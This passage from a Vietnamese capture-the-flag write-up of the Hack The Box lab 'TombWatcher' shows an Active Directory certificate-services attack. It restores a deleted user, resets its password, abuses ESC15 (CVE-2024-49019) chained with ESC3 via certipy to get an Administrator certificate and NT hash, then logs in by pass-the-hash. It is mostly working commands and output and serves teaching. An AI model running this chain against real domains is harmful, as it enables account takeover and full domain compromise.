    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```
Template `Machine`:
```
Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```
Template `WebServer` :
```
Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```
Lại là Object có SID `S-1-5-21-1392491010-1358638721-2126982587-1111`, ta sẽ tập trung vào template này trước.

Kiểm tra trong BloodHound cũng không thấy Object này,có khả năng nó đã bị xóa.

### AD Recycle Bin

Hiển thị thông tin chi tiết về certificate template WebServer
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> certutil -template WebServer
  Name: Active Directory Enrollment Policy
  Id: {DA893B98-8EEC-4A9A-B7A3-CA0392B7D97F}
  Url: ldap:
33 Templates:

  Template[31]:
  TemplatePropCommonName = WebServer
  TemplatePropFriendlyName = Web Server
  TemplatePropSecurityDescriptor = O:S-1-5-21-1392491010-1358638721-2126982587-519G:S-1-5-21-1392491010-1358638721-2126982587-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-1392491010-1358638721-2126982587-519)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-1392491010-1358638721-2126982587-1111)(A;;LCRPLORC;;;S-1-5-21-1392491010-1358638721-2126982587-1111)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-1392491010-1358638721-2126982587-519)(A;;LCRPLORC;;;AU)

    Allow Enroll        TOMBWATCHER\Domain Admins
    Allow Enroll        TOMBWATCHER\Enterprise Admins
    Allow Enroll        S-1-5-21-1392491010-1358638721-2126982587-1111
    Allow Read  S-1-5-21-1392491010-1358638721-2126982587-1111
    Allow Full Control  TOMBWATCHER\Domain Admins
    Allow Full Control  TOMBWATCHER\Enterprise Admins
    Allow Read  NT AUTHORITY\Authenticated Users
```
Ta thấy Object `S-1-5-21-1392491010-1358638721-2126982587-1111` được Allow Enroll nhưng không có username được resolve.

Khi SID không được giải mã thành tên người dùng có thể đọc được, gợi ý về một trong các khả năng sau:
- Một đối tượng bị ẩn
- Một người dùng đã bị xóa
- Hoặc một ACL được cấu hình sai

Kiểm tra:
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"
 
Cannot find an object with identity: 'S-1-5-21-1392491010-1358638721-2126982587-1111' under: 'DC=tombwatcher,DC=htb'.
At line:1 char:1
+ Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-111 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (S-1-5-21-139249...2126982587-1111:ADObject) [Get-ADObject], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirectory.Management.Commands.GetADObject
```
Để đào sâu hơn,thử kiểm tra trong `AD Recycle Bin`:
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADOptionalFeature 'Recycle Bin Feature'


DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : 907469ef-52c5-41ab-ad19-5fdec9e45082
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```
Xác nhận `AD Recycle Bin` có tồn tại do `IsDisableable : False` và `EnableScopes`.

Liệt kê User Object bị deleted:
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -SearchBase "CN=Deleted Objects,DC=tombwatcher,DC=htb" -LDAPFilter "(objectClass=user)" -IncludeDeletedObjects -Properties objectSid, samAccountName, lastKnownParent, whenChanged


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109      
samAccountName    : cert_admin
whenChanged       : 11/15/2024 7:57:59 PM

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110      
samAccountName    : cert_admin
whenChanged       : 11/16/2024 12:04:21 PM

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111      
samAccountName    : cert_admin
whenChanged       : 10/21/2025 3:07:01 AM
```
Phát hiện user `cert_admin` đã bị xóa có SID ta cần tìm.
```
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111      
samAccountName    : cert_admin
whenChanged       : 10/21/2025 3:07:01 AM
```
Ngoài ra còn phát hiện user này thuộc OU `ADCS` mà ta có quyền GenericAll từ John. Với quyền `GenericAll` trên toàn bộ OU, John có thể xâm phạm tài khoản `cert_admin` bằng nhiều cách.

Thử Restore user `cert_admin` :
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -SearchBase "CN=Deleted Objects,DC=tombwatcher,DC=htb" ` -IncludeDeletedObjects -LDAPFilter "(samAccountName=cert_admin)" ` -Properties * | Format-List samAccountName,objectGUID,Deleted,LastKnownParent


samAccountName  : cert_admin
objectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
Deleted         : True
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

samAccountName  : cert_admin
objectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
Deleted         : True
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

samAccountName  : cert_admin
objectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Deleted         : True
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

# Restore ADObject có GUID là 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'

# Set password cho account cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity 'cert_admin' -Reset -NewPassword (ConvertTo-SecureString 'Password@1234' -AsPlainText -Force)

# Kích hoạt account cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity 'cert_admin'
```
Thử lại xem đã kích hoạt thành công chưa:
```bash
nxc smb 10.10.11.72 -u 'cert_admin' -p 'Password@1234'

SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\cert_admin:Password@1234
```
Khi đã có account `cert_admin` , tiến hành dump lại CA :
```bash
❯ certipy find -u 'cert_admin' -p 'Password@1234' -dc-ip 10.10.11.72
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251022151611_Certipy.txt'
[*] Wrote text output to '20251022151611_Certipy.txt'
[*] Saving JSON output to '20251022151611_Certipy.json'       
[*] Wrote JSON output to '20251022151611_Certipy.json'
```
### ESC15
Chạy lại `certipy` với credentials của `cert_admin` , ta phát hiện có thể dùng `CVE 2024-49019` để exploit template WebServer: 
```
Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
#### Exploit
> Theo [certify wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) ESC15, còn được cộng đồng gọi là "EKUwu" ,được theo dõi dưới mã CVE-2024-49019, mô tả một lỗ hổng ảnh hưởng đến các CA (Certificate Authority) chưa được vá.

>ESC15 (EKUwu) là một lỗ hổng trong AD CS cho phép người yêu cầu chứng chỉ tự ý thêm mục đích sử dụng mới (Application Policy) vào chứng chỉ được cấp, khiến chứng chỉ có thể được dùng cho những hành động mà CA không cho phép — ví dụ: đăng nhập người dùng (Client Auth) bằng chứng chỉ vốn chỉ dùng cho máy chủ web (Server Auth).

Dưới đây là 2 kịch bản tấn công được trình bày ở wiki.

**Hướng 1:** Impersonation trực tiếp qua Schannel (Inject "Client Authentication" Application Policy).Giả định rằng V1 template (ở đây là WebServer) cho phép attacker xác định target UPN ở trong SAN, và target service (ví dụ LDAPS) sử dụng Schannel

- Bước 1: Yêu cầu certificate, inject "Client Authentication" Application Policy và target UPN. Attacker `cert_admin` target `administrator@tombwatcher` sử dụng WebServer V1 template (template cho phép enrollee-supplied subject).
```bash
❯ certipy req -u cert_admin -p 'Password@1234' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
- Thử authentication với pfx đó nhưng thất bại:
> Tệp .pfx (viết tắt của Personal Information Exchange) là định dạng lưu trữ chứng chỉ số cùng với khóa riêng (private key) — thường được dùng trong Windows, IIS, AD CS, và nhiều ứng dụng bảo mật khác.
```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
```
> EKU (Extended Key Usage) là một thuộc tính (extension) trong chứng chỉ số (X.509 certificate) dùng để chỉ định mục đích sử dụng hợp lệ của chứng chỉ đó.

- Có một lỗi EKU (Sử dụng Khóa Nâng cao) ở đây, là bởi vì đã sử dụng certificate này theo một cách không chủ đích. Tuy nhiên, certificate này vẫn có thể hoạt động qua LDAP. Bây giờ, cố gắng sử dụng nó để lấy một LDAP shell qua Schannel, nhưng thất bại:
```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[-] Failed to connect to LDAP server: ("('socket ssl wrapping error: [SSL: CA_MD_TOO_WEAK] ca md too weak (_ssl.c:3895)',)",)
[-] Use -debug to print a stacktrace
```

**Hướng 2:** PKINIT/Kerberos Impersonation thông qua Enrollment Agent Abuse (Inject "Certificate Request Agent" Application Policy). Tình huống này liên quan đến việc trước tiên lấy được một "agent" certificate bằng cách inject the "Certificate Request Agent" policy và sau đó sử dụng certificate đó để yêu cầu một chứng chỉ cho một người dùng có đặc quyền.

- Lần này thay vì cấp cho chứng chỉ được tạo ra khả năng xác thực, tôi sẽ cấp cho nó thuộc tính agent:
```bash
❯ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password@1234' -dc-ip '10.10.11.72' -target
 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```
Đến đây, về cơ bản có thể hoàn tất cuộc tấn công ESC3.Sử dụng tệp PFX đó để yêu cầu một ticket với vai trò là Administrator cho một template được thiết kế cho mục đích người dùng đăng nhập:
```bash
❯ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password@1234' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx' 
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
- Giờ có thể `auth` với ticket vừa tạo:
```bash
❯ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:64f2e19ff01777d91e44426cfe66f0ea
```
- Cả TGT và NTLM hash của administrator account đều đc trả về. Lấy shell với `evil-winrm`:
```bash
❯ evil-winrm -i 10.10.11.72 -u administrator -H 64f2e19ff01777d91e44426cfe66f0ea  

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
dac0a787e4fc0f4322f7c438b38db8bc
```
> Flag 2: `dac0a787e4fc0f4322f7c438b38db8bc`